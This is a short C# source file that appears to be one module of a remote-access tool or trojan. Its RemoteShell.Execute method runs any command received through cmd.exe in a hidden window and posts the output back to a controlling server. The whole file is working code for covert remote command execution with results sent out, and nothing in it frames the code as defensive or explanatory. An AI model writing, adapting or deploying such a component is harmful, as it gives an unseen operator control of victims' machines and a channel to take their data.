using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using True.Core;

namespace True.Features
{
    public static class RemoteShell
    {
        public static async Task Execute(string command)
        {
            Logger.Info("RemoteShell", $"Executing: {command}");

            var psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8
            };

            try
            {
                using var process = Process.Start(psi);
                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();

                process.WaitForExit();

                string result = string.IsNullOrWhiteSpace(output) ? error : output;
                if (string.IsNullOrWhiteSpace(result))
                    result = "[No output]";

                Logger.Info("RemoteShell", $"Output: {result.Trim()}");

                // Send result back to the server
                await Communicator.PostResponse("exec", result);
            }
            catch (Exception ex)
            {
                Logger.Error("RemoteShell", $"Exception: {ex.Message}");
            }
        }
    }
}
